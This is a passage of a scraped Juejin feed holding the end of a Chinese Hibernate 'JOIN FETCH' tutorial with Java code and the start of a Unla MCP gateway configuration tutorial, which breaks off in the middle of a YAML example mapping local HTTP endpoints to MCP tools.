<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.cfg.Configuration;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateUtil</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> SessionFactory sessionFactory;

    <span class="hljs-keyword">static</span> {
        <span class="hljs-keyword">try</span> {
            sessionFactory = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Configuration</span>().configure(<span class="hljs-string">"hibernate.cfg.xml"</span>).buildSessionFactory();
        } <span class="hljs-keyword">catch</span> (Throwable ex) {
            System.err.println(<span class="hljs-string">"Initial SessionFactory creation failed."</span> + ex);
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExceptionInInitializerError</span>(ex);
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> SessionFactory <span class="hljs-title function_">getSessionFactory</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> sessionFactory;
    }
}
</code></pre>
<h4 data-id="heading-7">步骤四：使用Fetch Join查询</h4>
<p>我们可以编写一个方法来演示如何使用<code>fetch join</code>来查询数据。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.hibernate.Session;
<span class="hljs-keyword">import</span> org.hibernate.SessionFactory;
<span class="hljs-keyword">import</span> org.hibernate.query.Query;
<span class="hljs-keyword">import</span> com.example.domain.Category;
<span class="hljs-keyword">import</span> com.example.domain.Product;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HibernateFetchJoinExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 获取SessionFactory</span>
        <span class="hljs-type">SessionFactory</span> <span class="hljs-variable">sessionFactory</span> <span class="hljs-operator">=</span> HibernateUtil.getSessionFactory();

        <span class="hljs-comment">// 插入示例数据</span>
        insertSampleData(sessionFactory);

        <span class="hljs-comment">// 使用Fetch Join查询数据</span>
        fetchJoinExample(sessionFactory);

        <span class="hljs-comment">// 关闭SessionFactory</span>
        sessionFactory.close();
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">insertSampleData</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        session.beginTransaction();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Category</span> <span class="hljs-variable">category</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Category</span>();
            category.setName(<span class="hljs-string">"Electronics"</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product1.setName(<span class="hljs-string">"Laptop"</span>);
            product1.setPrice(<span class="hljs-number">1000.0</span>);

            <span class="hljs-type">Product</span> <span class="hljs-variable">product2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();
            product2.setName(<span class="hljs-string">"Smartphone"</span>);
            product2.setPrice(<span class="hljs-number">500.0</span>);

            category.addProduct(product1);
            category.addProduct(product2);

            session.save(category);

            session.getTransaction().commit();
            System.out.println(<span class="hljs-string">"Inserted sample data"</span>);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            session.getTransaction().rollback();
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }

    <span class="hljs-meta">@SuppressWarnings("unchecked")</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">fetchJoinExample</span><span class="hljs-params">(SessionFactory sessionFactory)</span> {
        <span class="hljs-type">Session</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> sessionFactory.openSession();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">String</span> <span class="hljs-variable">hql</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SELECT c FROM Category c JOIN FETCH c.products WHERE c.id = :categoryId"</span>;
            Query&lt;Category&gt; query = session.createQuery(hql);
            query.setParameter(<span class="hljs-string">"categoryId"</span>, <span class="hljs-number">1L</span>);

            <span class="hljs-type">Category</span> <span class="hljs-variable">category</span> <span class="hljs-operator">=</span> query.uniqueResult();

            System.out.println(<span class="hljs-string">"Category: "</span> + category.getName());
            <span class="hljs-keyword">for</span> (Product product : category.getProducts()) {
                System.out.println(<span class="hljs-string">"Product: "</span> + product.getName() + <span class="hljs-string">" - $"</span> + product.getPrice());
            }
        } <span class="hljs-keyword">catch</span> (Exception e) {
            e.printStackTrace();
        } <span class="hljs-keyword">finally</span> {
            session.close();
        }
    }
}
</code></pre>
<h3 data-id="heading-8">详细解释</h3>
<ol>
<li>
<p><strong>定义实体类</strong>：</p>
<ul>
<li><code>Category</code>类与<code>Product</code>类是一对多关系，<code>Category</code>可以有多个<code>Product</code>。</li>
<li>在<code>Category</code>类中，<code>@OneToMany</code>注解用于定义与<code>Product</code>的关联关系，并且通过<code>fetch = FetchType.LAZY</code>指定延迟加载。</li>
</ul>
</li>
<li>
<p><strong>配置文件</strong>：</p>
<ul>
<li><code>hibernate.cfg.xml</code>配置文件用于设置数据库连接、Hibernate属性和映射类。</li>
</ul>
</li>
<li>
<p><strong>实用类HibernateUtil</strong>：</p>
<ul>
<li><code>HibernateUtil</code>类提供了获取<code>SessionFactory</code>实例的方法。</li>
</ul>
</li>
<li>
<p><strong>使用Fetch Join查询</strong>：</p>
<ul>
<li>在<code>insertSampleData</code>方法中，创建并保存一个<code>Category</code>和两个关联的<code>Product</code>。</li>
<li>在<code>fetchJoinExample</code>方法中，使用HQL中的<code>JOIN FETCH</code>关键字进行查询。<code>JOIN FETCH</code>可以同时加载<code>Category</code>及其关联的<code>Product</code>，从而避免了N+1查询问题。</li>
<li><code>query.uniqueResult()</code>返回一个唯一的<code>Category</code>结果，并且由于使用了<code>fetch join</code>，相关联的<code>Product</code>集合已经被初始化和加载。</li>
</ul>
</li>
</ol>
<p>通过这种方式，可以有效地利用<code>fetch join</code>来优化关联实体的加载过程，提高数据库访问的性能。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Unla MCP 网关代理配置教程]]></title>    <link>https://juejin.cn/post/7594919272686567450</link>    <guid>https://juejin.cn/post/7594919272686567450</guid>    <pubDate>2026-01-14T03:57:40.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594919272686567450" data-draft-id="7594854295746297892" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Unla MCP 网关代理配置教程"/> <meta itemprop="keywords" content="MCP"/> <meta itemprop="datePublished" content="2026-01-14T03:57:40.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ALLINAI"/> <meta itemprop="url" content="https://juejin.cn/user/4001878056639549"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Unla MCP 网关代理配置教程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4001878056639549/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ALLINAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T03:57:40.000Z" title="Wed Jan 14 2026 03:57:40 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    18
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>Unla</strong> 是一个轻量级的 MCP 网关服务，它的核心优势在于“零代码侵入”。通过配置，可以将传统的 HTTP API 转换为标准 MCP 协议，或对现有的 MCP Server 进行反向代理。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.unla.amoylab.com%2Fcn%2Fconfiguration%2Fgateways" target="_blank" title="https://docs.unla.amoylab.com/cn/configuration/gateways" ref="nofollow noopener noreferrer">Unla MCP 网关配置官方文档</a></p>
<h4 data-id="heading-0">一、 准备工作</h4>
<ol>
<li><strong>部署 Unla</strong>：通过 Docker 或源码启动了 Unla。</li>
<li><strong>管理后台</strong>：访问 Unla 的 Web UI（默认地址通常为 <code>http://localhost:5234</code>）。</li>
</ol>
<h4 data-id="heading-1">二、 配置网关代理 (Gateways)</h4>
<p>在 Unla 中，网关配置通常分为两种场景：<strong>代理现有 MCP Server</strong> 和 <strong>转换 HTTP API</strong>。</p>
<h5 data-id="heading-2">1. 代理现有的 MCP Server</h5>
<p>如果你已经有一个运行中的 MCP Server（例如 Python/Node.js 编写的），可以通过 Unla 进行中转。</p>
<ul>
<li><strong>步骤</strong>：
<ol>
<li>登录 Web UI，点击 <strong>"网关配置"</strong> &gt; <strong>"创建"</strong> &gt; <strong>"MCP服务"</strong>。</li>
<li>选择 <strong>"YAML模式"</strong> 或者 <strong>"表单模式"</strong> 填写配置信息。</li>
<li>点击 <strong>"创建"</strong> 按钮。</li>
</ol>
</li>
</ul>
<h5 data-id="heading-3">2. 将 HTTP API 转换为 MCP 工具</h5>
<ul>
<li><strong>步骤</strong>：
<ol>
<li>登录 Web UI，点击 <strong>"网关配置"</strong> &gt; <strong>"创建"</strong> &gt; <strong>"HTTP服务"</strong>。</li>
<li>选择 <strong>"YAML模式"</strong> 或者 <strong>"表单模式"</strong> 填写配置信息。</li>
<li>点击 <strong>"创建"</strong> 按钮。</li>
</ol>
</li>
</ul>
<p>这是 Unla 最强大的功能，只需编写 YAML 即可将普通的HTTP接口变成 AI 代理工具。</p>
<ul>
<li><strong>YAML配置示例</strong>：</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">name:</span> <span class="hljs-string">"mock-server"</span>              <span class="hljs-comment"># 代理服务名称，全局唯一</span>
<span class="hljs-attr">tenant:</span> <span class="hljs-string">"default"</span>                <span class="hljs-comment"># 租户标识，用于多租户场景</span>

<span class="hljs-comment"># 路由配置</span>
<span class="hljs-attr">routers:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">server:</span> <span class="hljs-string">"mock-server"</span>       <span class="hljs-comment"># 服务名称</span>
    <span class="hljs-attr">prefix:</span> <span class="hljs-string">"/gateway/user"</span>     <span class="hljs-comment"># 路由前缀，全局唯一，不可重复（必须以租户ID开头）</span>

    <span class="hljs-comment"># CORS 配置</span>
    <span class="hljs-attr">cors:</span>
      <span class="hljs-attr">allowOrigins:</span>             <span class="hljs-comment"># 开发测试环境可全部开放，线上最好按需开放。（大部分MCP Client是不需要开放跨域的）</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"*"</span>
      <span class="hljs-attr">allowMethods:</span>             <span class="hljs-comment"># 允许的请求方法，按需开放，对于MCP（SSE和Streamable）来说通常只需要这3个方法即可</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"GET"</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"POST"</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"PUT"</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"OPTIONS"</span>
      <span class="hljs-attr">allowHeaders:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"Content-Type"</span>        <span class="hljs-comment"># 必须允许的</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"Authorization"</span>       <span class="hljs-comment"># 有鉴权需求的需要支持请求里携带此Key</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"Mcp-Session-Id"</span>      <span class="hljs-comment"># 对于MCP来说，必须支持请求里携带这个Key，否则Streamable HTTP无法正常使用</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"mcp-protocol-version"</span> <span class="hljs-comment"># MCP协议版本头，用于协议版本协商</span>
      <span class="hljs-attr">exposeHeaders:</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"Mcp-Session-Id"</span>      <span class="hljs-comment"># 对于MCP来说，开启跨域的时候必须要暴露这个Key，否则Streamable HTTP无法正常使用</span>
        <span class="hljs-bullet">-</span> <span class="hljs-string">"mcp-protocol-version"</span> <span class="hljs-comment"># MCP协议版本头</span>
      <span class="hljs-attr">allowCredentials:</span> <span class="hljs-literal">true</span>    <span class="hljs-comment"># 是否增加 Access-Control-Allow-Credentials: true 这个Header</span>

<span class="hljs-comment"># 服务配置</span>
<span class="hljs-attr">servers:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"mock-server"</span>               <span class="hljs-comment"># 服务名称，需要与routers中的server保持一致</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Mock User Service"</span>  <span class="hljs-comment"># 服务描述</span>
    <span class="hljs-attr">allowedTools:</span>                     <span class="hljs-comment"># 允许使用的工具列表（为tools的子集）</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"register_user"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"get_user_by_email"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"update_user_preferences"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">"update_user_avatar"</span>
    <span class="hljs-attr">config:</span>                                           <span class="hljs-comment"># 服务级别的配置，可以在tools中通过{{.Config}}引用</span>
      <span class="hljs-attr">Cookie:</span> <span class="hljs-number">123</span>                                     <span class="hljs-comment"># 写死的配置</span>
      <span class="hljs-attr">Authorization:</span> <span class="hljs-string">'Bearer <span class="hljs-template-variable">{{ env "AUTH_TOKEN" }}</span>'</span>  <span class="hljs-comment"># 从环境变量中获取的配置，用法是'{{ env "ENV_VAR_NAME" }}'</span>

<span class="hljs-comment"># 工具配置</span>
<span class="hljs-attr">tools:</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"register_user"</span>                                   <span class="hljs-comment"># 工具名称</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Register a new user"</span>                      <span class="hljs-comment"># 工具描述</span>
    <span class="hljs-attr">method:</span> <span class="hljs-string">"POST"</span>                                          <span class="hljs-comment"># 请求目标（上游、后端）服务的HTTP方法</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://localhost:5236/users"</span>                 <span class="hljs-comment"># 目标服务地址</span>
    <span class="hljs-attr">headers:</span>                                                <span class="hljs-comment"># 请求头配置，用于在请求目标服务时携带的请求头</span>
      <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">"application/json"</span>                      <span class="hljs-comment"># 写死的请求头</span>
      <span class="hljs-attr">Authorization:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Config.Authorization}}</span>"</span>            <span class="hljs-comment"># 使用服务配置中的值</span>
      <span class="hljs-attr">Cookie:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Config.Cookie}}</span>"</span>                          <span class="hljs-comment"># 使用服务配置中的值</span>
    <span class="hljs-attr">args:</span>                         <span class="hljs-comment"># 参数配置</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"username"</span>          <span class="hljs-comment"># 参数名称</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>          <span class="hljs-comment"># 参数位置：header, query, path, body, form-data</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>            <span class="hljs-comment"># 参数是否必填</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>            <span class="hljs-comment"># 参数类型</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Username"</span>   <span class="hljs-comment"># 参数描述</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>               <span class="hljs-comment"># 默认值</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"email"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Email"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
    <span class="hljs-attr">requestBody:</span> <span class="hljs-string">|-</span>               <span class="hljs-comment"># 请求体模板，用于动态生成请求体，如：从参数（MCP的请求arguments）中提取的值</span>
      {
        <span class="hljs-attr">"username":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Args.username}}</span>"</span>,
        <span class="hljs-attr">"email":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Args.email}}</span>"</span>
      }
    <span class="hljs-attr">responseBody:</span> <span class="hljs-string">|-</span>              <span class="hljs-comment"># 响应体模板，用于动态生成响应体，如：从响应中提取的值</span>
      {
        <span class="hljs-attr">"id":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Response.Data.id}}</span>"</span>,
        <span class="hljs-attr">"username":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Response.Data.username}}</span>"</span>,
        <span class="hljs-attr">"email":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Response.Data.email}}</span>"</span>,
        <span class="hljs-attr">"createdAt":</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Response.Data.createdAt}}</span>"</span>
      }

  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"get_user_by_email"</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Get user by email"</span>
    <span class="hljs-attr">method:</span> <span class="hljs-string">"GET"</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://localhost:5236/users/email/<span class="hljs-template-variable">{{.Args.email}}</span>"</span>
    <span class="hljs-attr">args:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"email"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"path"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Email"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
    <span class="hljs-attr">responseBody:</span> <span class="hljs-string">|-
      {
        "id": "{{.Response.Data.id}}",
        "username": "{{.Response.Data.username}}",
        "email": "{{.Response.Data.email}}",
        "createdAt": "{{.Response.Data.createdAt}}"
      }
</span>
  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"update_user_preferences"</span>
    <span class="hljs-attr">description:</span> <span class="hljs-string">"Update user preferences"</span>
    <span class="hljs-attr">method:</span> <span class="hljs-string">"PUT"</span>
    <span class="hljs-attr">endpoint:</span> <span class="hljs-string">"http://localhost:5236/users/<span class="hljs-template-variable">{{.Args.email}}</span>/preferences"</span>
    <span class="hljs-attr">headers:</span>
      <span class="hljs-attr">Content-Type:</span> <span class="hljs-string">"application/json"</span>
      <span class="hljs-attr">Authorization:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Request.Headers.Authorization}}</span>"</span>
      <span class="hljs-attr">Cookie:</span> <span class="hljs-string">"<span class="hljs-template-variable">{{.Config.Cookie}}</span>"</span>
    <span class="hljs-attr">args:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"email"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"path"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Email"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">""</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"isPublic"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"boolean"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Whether the user profile is public"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"false"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"showEmail"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"boolean"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"Whether to show email in profile"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"true"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"theme"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"User interface theme"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"light"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"tags"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">true</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"array"</span>
        <span class="hljs-attr">items:</span>
          <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
          <span class="hljs-attr">enum:</span> [<span class="hljs-string">"developer"</span>, <span class="hljs-string">"designer"</span>, <span class="hljs-string">"manager"</span>, <span class="hljs-string">"tester"</span>]
        <span class="hljs-attr">description:</span> <span class="hljs-string">"User role tags"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"[]"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"settings"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">false</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"object"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"User custom settings as key-value pairs"</span>
        <span class="hljs-attr">default:</span> <span class="hljs-string">"{}"</span>
      <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">"notifications"</span>
        <span class="hljs-attr">position:</span> <span class="hljs-string">"body"</span>
        <span class="hljs-attr">required:</span> <span class="hljs-literal">false</span>
        <span class="hljs-attr">type:</span> <span class="hljs-string">"array"</span>
        <span class="hljs-attr">description:</span> <span class="hljs-string">"User notification preferences"</span>
        <span class="hljs-attr">items:</span>
          <span class="hljs-attr">type:</span> <span class="hljs-string">"object"</span>
          <span class="hljs-attr">properties:</span>
            <span class="hljs-attr">type:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
              <span class="hljs-attr">description:</span> <span class="hljs-string">"Notification type (email, push, sms)"</span>
            <span class="hljs-attr">channel:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">"string"</span>
              <span class="hljs-attr">description:</span> <span class="hljs-string">"Notification channel (marketing, system, security)"</span>
            <span class="hljs-attr">enabled:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">"boolean"</span>
              <span class="hljs-attr">description:</span> <span class="hljs-string">"Whether this notification is enabled"</span>
            <span class="hljs-attr">frequency:</span>
              <span class="hljs-attr">type:</span> <span class="hljs-string">"number"</span>
              <span class="hljs-attr">description:</span> <span class="hljs-string">"Notification frequency (0: realtime, 1: daily, 2: weekly, 3: monthly)"</span>
